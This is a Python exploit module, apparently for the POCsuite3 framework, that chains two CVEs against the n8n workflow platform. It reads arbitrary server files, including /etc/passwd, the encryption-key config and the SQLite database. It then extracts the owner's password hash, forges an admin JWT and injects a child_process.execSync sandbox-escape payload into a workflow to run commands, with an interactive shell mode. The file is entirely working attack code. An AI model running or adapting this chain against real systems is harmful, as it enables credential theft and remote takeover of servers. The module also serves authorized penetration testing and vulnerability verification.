#!/usr/bin/env python3
"""
CVE-2026-21858 + CVE-2025-68613 - n8n Full Chain RCE Exploit

This PoC exploits the complete attack chain:
1. Arbitrary File Read (CVE-2026-21858)
2. Admin Token Forgery
3. Sandbox Bypass → RCE (CVE-2025-68613)

Author: POCsuite3 adaptation
References:
- https://github.com/Chocapikk/CVE-2026-21858
- CVE-2026-21858
- CVE-2025-68613
"""

import hashlib
import json
import secrets
import string
import tempfile
import sqlite3
from collections import OrderedDict
from base64 import b64encode
from pocsuite3.api import (
    Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from pocsuite3.lib.core.interpreter_option import OptString

try:
    import jwt
except ImportError:
    jwt = None


def randstr(n: int = 12) -> str:
    """Generate random string for unique identifiers"""
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def randpos() -> list:
    """Generate random position for workflow nodes"""
    return [secrets.randbelow(500) + 100, secrets.randbelow(500) + 100]


class CVE20262158RCEPOC(POCBase):
    """Full Chain RCE PoC for CVE-2026-21858 + CVE-2025-68613"""

    pocInfo = {
        'name': 'CVE-2026-21858 + CVE-2025-68613 n8n Full Chain RCE',
        'vulID': 'CVE-2026-21858',
        'author': 'POCsuite3 adaptation',
        'vulType': VUL_TYPE.CODE_EXECUTION,
        'category': POC_CATEGORY.EXPLOITS.WEBAPP,
        'version': '1.0',
        'references': [
            'https://github.com/Chocapikk/CVE-2026-21858',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-21858',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-68613'
        ],
        'appName': 'n8n',
        'appVersion': '< 1.121.0',
        'desc': '''
        n8n workflow automation platform is vulnerable to a full attack chain:
        1. CVE-2026-21858: Arbitrary file read through form submission
        2. Read encryption key and database to extract admin credentials
        3. Forge JWT authentication token
        4. CVE-2025-68613: Sandbox bypass leading to RCE
        ''',
        'install_requires': ['requests>=2.20.0', 'pyjwt>=2.0.0:jwt']
    }

    RCE_PAYLOAD = '={{ (function() { var require = this.process.mainModule.require; var execSync = require("child_process").execSync; return execSync("CMD").toString(); })() }}'

    def __init__(self):
        super(CVE20262158RCEPOC, self).__init__()
        self.form_url = None
        self.admin_token = None
        self.session = None

    def _options(self):
        """Define options for this PoC"""
        opt = OrderedDict()
        opt["form_path"] = OptString(
            "/form/form",
            description="Form submission endpoint path",
            require=False
        )
        opt["command"] = OptString(
            "whoami",
            description="Command to execute in attack mode",
            require=False
        )
        return opt

    def _init_session(self):
        """Initialize HTTP session"""
        if not self.session:
            self.session = requests.Session()

    def _build_lfi_payload(self, filepath: str) -> dict:
        """Build LFI payload for file read"""
        return {
            "data": {},
            "files": {
                f"f-{randstr(6)}": {
                    "filepath": filepath,
                    "originalFilename": f"{randstr(8)}.bin",
                    "mimetype": "application/octet-stream",
                    "size": secrets.randbelow(90000) + 10000
                }
            }
        }

    def read_file(self, filepath: str, timeout: int = 30) -> tuple[bool, bytes | None]:
        """Read arbitrary file from target server"""
        try:
            resp = self.session.post(
                self.form_url,
                json=self._build_lfi_payload(filepath),
                headers={"Content-Type": "application/json"},
                timeout=timeout
            )
            if resp.ok and resp.content:
                return True, resp.content
        except Exception as e:
            logger.error(f"Failed to read file {filepath}: {str(e)}")
        return False, None

    def get_home(self) -> str | None:
        """Get HOME directory from /proc/self/environ"""
        success, data = self.read_file("/proc/self/environ")
        if not success or not data:
            return None
        for var in data.split(b"\x00"):
            if var.startswith(b"HOME="):
                return var.decode().split("=", 1)[1]
        return None

    def get_key(self, home: str) -> str | None:
        """Read encryption key from n8n config"""
        success, data = self.read_file(f"{home}/.n8n/config")
        if success and data:
            try:
                return json.loads(data).get("encryptionKey")
            except:
                pass
        return None

    def get_db(self, home: str) -> tuple[bool, bytes | None]:
        """Read n8n database"""
        return self.read_file(f"{home}/.n8n/database.sqlite", timeout=120)

    def extract_admin(self, db: bytes) -> tuple[str, str, str] | None:
        """Extract admin credentials from database"""
        try:
            with tempfile.NamedTemporaryFile(suffix=".db") as f:
                f.write(db)
                f.flush()
                conn = sqlite3.connect(f.name)
                row = conn.execute(
                    "SELECT id, email, password FROM user WHERE role='global:owner' LIMIT 1"
                ).fetchone()
                conn.close()
            return (row[0], row[1], row[2]) if row else None
        except Exception as e:
            logger.error(f"Failed to extract admin: {str(e)}")
        return None

    def forge_token(self, key: str, uid: str, email: str, pw_hash: str) -> str:
        """Forge admin JWT token"""
        if jwt is None:
            logger.error("PyJWT library is required for token forging")
            logger.error("")
            logger.error("Please install PyJWT:")
            logger.error("  pip install pyjwt")
            logger.error("")
            logger.error("Or using pip:")
            logger.error("  pip3 install pyjwt")
            logger.error("")
            logger.error("Or using python -m pip:")
            logger.error("  python -m pip install pyjwt")
            logger.error("")
            return None

        secret = hashlib.sha256(key[::2].encode()).hexdigest()
        h = b64encode(hashlib.sha256(f"{email}:{pw_hash}".encode()).digest()).decode()[:10]
        self.admin_token = jwt.encode({"id": uid, "hash": h}, secret, "HS256")
        return self.admin_token

    def verify_admin(self) -> bool:
        """Verify if forged token is valid"""
        try:
            resp = self.session.get(
                f"{self.url.rstrip('/')}/rest/users",
                cookies={"n8n-auth": self.admin_token},
                timeout=10
            )
            return resp.status_code == 200
        except:
            pass
        return False

    def _build_nodes(self, command: str) -> tuple:
        """Build workflow nodes for RCE"""
        trigger_name = f"T-{randstr(8)}"
        rce_name = f"R-{randstr(8)}"
        result_var = f"v{randstr(6)}"
        payload_value = self.RCE_PAYLOAD.replace("CMD", command.replace('"', '\\"'))

        nodes = [
            {
                "parameters": {},
                "name": trigger_name,
                "type": "n8n-nodes-base.manualTrigger",
                "typeVersion": 1,
                "position": randpos(),
                "id": f"t-{randstr(12)}"
            },
            {
                "parameters": {
                    "values": {
                        "string": [{"name": result_var, "value": payload_value}]
                    }
                },
                "name": rce_name,
                "type": "n8n-nodes-base.set",
                "typeVersion": 2,
                "position": randpos(),
                "id": f"r-{randstr(12)}"
            }
        ]

        connections = {trigger_name: {"main": [[{"node": rce_name, "type": "main", "index": 0}]]}}
        return nodes, connections, trigger_name, rce_name

    def execute_command(self, command: str) -> str | None:
        """Execute command via vulnerable workflow"""
        nodes, connections, _, _ = self._build_nodes(command)
        wf_name = f"wf-{randstr(16)}"

        workflow = {
            "name": wf_name,
            "active": False,
            "nodes": nodes,
            "connections": connections,
            "settings": {}
        }

        # Create workflow
        try:
            resp = self.session.post(
                f"{self.url.rstrip('/')}/rest/workflows",
                json=workflow,
                cookies={"n8n-auth": self.admin_token},
                timeout=10
            )

            if resp.status_code != 200:
                logger.error(f"Failed to create workflow: {resp.status_code}")
                return None

            wf_id = resp.json().get("data", {}).get("id")
            if not wf_id:
                logger.error("Failed to get workflow ID")
                return None
        except Exception as e:
            logger.error(f"Failed to create workflow: {str(e)}")
            return None

        # Execute workflow
        try:
            run_data = {
                "workflowData": {
                    "id": wf_id,
                    "name": wf_name,
                    "active": False,
                    "nodes": nodes,
                    "connections": connections,
                    "settings": {}
                }
            }

            resp = self.session.post(
                f"{self.url.rstrip('/')}/rest/workflows/{wf_id}/run",
                json=run_data,
                cookies={"n8n-auth": self.admin_token},
                timeout=30
            )

            if resp.status_code != 200:
                logger.error(f"Failed to run workflow: {resp.status_code}")
                self.session.delete(
                    f"{self.url.rstrip('/')}/rest/workflows/{wf_id}",
                    cookies={"n8n-auth": self.admin_token},
                    timeout=5
                )
                return None

            exec_id = resp.json().get("data", {}).get("executionId")
            result = self._get_result(exec_id) if exec_id else None

            # Cleanup
            self.session.delete(
                f"{self.url.rstrip('/')}/rest/workflows/{wf_id}",
                cookies={"n8n-auth": self.admin_token},
                timeout=5
            )

            return result
        except Exception as e:
            logger.error(f"Failed to execute workflow: {str(e)}")
        return None

    def _get_result(self, exec_id: str) -> str | None:
        """Get execution result"""
        try:
            resp = self.session.get(
                f"{self.url.rstrip('/')}/rest/executions/{exec_id}",
                cookies={"n8n-auth": self.admin_token},
                timeout=10
            )

            if resp.status_code == 200:
                data = resp.json().get("data", {}).get("data")
                if data:
                    parsed = json.loads(data)
                    # Result is usually the last non-empty string
                    for item in reversed(parsed):
                        if isinstance(item, str) and len(item) > 3 and item not in ("success", "error"):
                            return item.strip()
        except Exception as e:
            logger.error(f"Failed to get result: {str(e)}")
        return None

    def _exploit_full_chain(self) -> bool:
        """Execute full exploit chain"""
        # Step 1: Get HOME directory
        logger.info("Step 1: Reading HOME directory from /proc/self/environ")
        home = self.get_home()
        if not home:
            logger.error("Failed to get HOME directory")
            return False
        logger.info(f"HOME: {home}")

        # Step 2: Get encryption key
        logger.info("Step 2: Reading encryption key from config")
        key = self.get_key(home)
        if not key:
            logger.error("Failed to get encryption key")
            return False
        logger.info(f"Key: {key[:8]}...")

        # Step 3: Get database
        logger.info("Step 3: Reading n8n database")
        success, db = self.get_db(home)
        if not success or not db:
            logger.error("Failed to get database")
            return False
        logger.info(f"Database: {len(db)} bytes")

        # Step 4: Extract admin credentials
        logger.info("Step 4: Extracting admin credentials")
        admin = self.extract_admin(db)
        if not admin:
            logger.error("Failed to extract admin")
            return False
        uid, email, pw = admin
        logger.info(f"Admin: {email}")

        # Step 5: Forge token
        logger.info("Step 5: Forging admin JWT token")
        self.forge_token(key, uid, email, pw)
        if not self.admin_token:
            return False
        logger.info("Token forged successfully")

        # Step 6: Verify admin access
        logger.info("Step 6: Verifying admin access")
        if not self.verify_admin():
            logger.error("Admin verification failed")
            return False
        logger.info("Admin access granted!")

        return True

    def _verify(self):
        """Verify mode: Check if target is vulnerable"""
        output = Output(self)

        # Initialize
        form_path = self.get_option("form_path")
        if not form_path:
            form_path = "/form/form"

        self.form_url = f"{self.url.rstrip('/')}/{form_path.lstrip('/')}"
        self._init_session()

        logger.info(f"Testing form endpoint: {self.form_url}")

        # Quick check: Try to read /etc/passwd
        success, content = self.read_file("/etc/passwd")

        if success and content:
            try:
                content_str = content.decode('utf-8', errors='ignore')
                if 'root:' in content_str and '/bin/' in content_str:
                    logger.info("Target is vulnerable to CVE-2026-21858!")
                    result = {
                        'VerifyInfo': {
                            'URL': self.url,
                            'FormPath': form_path,
                            'VulType': 'Arbitrary File Read + RCE',
                            'Payload': '/etc/passwd'
                        },
                        'Extra': {
                            'evidence': content_str[:200] + "..." if len(content_str) > 200 else content_str
                        }
                    }
                    output.success(result)
                    return output
            except:
                pass

        output.fail("Target is not vulnerable")
        return output

    def _attack(self):
        """Attack mode: Execute command on target"""
        output = Output(self)

        # Initialize
        form_path = self.get_option("form_path")
        if not form_path:
            form_path = "/form/form"

        self.form_url = f"{self.url.rstrip('/')}/{form_path.lstrip('/')}"
        self._init_session()

        # Get command to execute
        command = self.get_option("command")
        if not command:
            command = "whoami"

        # Execute full chain
        if not self._exploit_full_chain():
            output.fail("Failed to establish full chain exploit")
            return output

        # Execute command
        logger.info(f"Executing command: {command}")
        cmd_output = self.execute_command(command)

        if cmd_output:
            logger.info("Command executed successfully")
            result = {
                'ShellInfo': {
                    'URL': self.url,
                    'Command': command
                },
                'Extra': {
                    'output': cmd_output,
                    'evidence': cmd_output[:500] + "..." if len(cmd_output) > 500 else cmd_output
                }
            }
            output.success(result)
            return output

        output.fail(f"Failed to execute command: {command}")
        return output

    def _shell(self):
        """Shell mode: Interactive shell"""
        # Initialize
        form_path = self.get_option("form_path")
        if not form_path:
            form_path = "/form/form"

        self.form_url = f"{self.url.rstrip('/')}/{form_path.lstrip('/')}"
        self._init_session()

        # Execute full chain first
        if not self._exploit_full_chain():
            logger.error("Failed to establish shell")
            return

        logger.info("Interactive shell ready (type 'exit' to quit)")
        print("\n" + "="*60)
        print("n8n RCE Shell - CVE-2026-21858 + CVE-2025-68613")
        print("="*60 + "\n")

        while True:
            try:
                cmd = input("\033[91mn8n\033[0m@{}> ".format(self.rhost)).strip()
            except (EOFError, KeyboardInterrupt):
                print("\nExiting shell...")
                break

            if not cmd or cmd.lower() == 'exit':
                break

            output = self.execute_command(cmd)
            if output:
                print(output)
            else:
                logger.error("Command execution failed")


register_poc(CVE20262158RCEPOC)
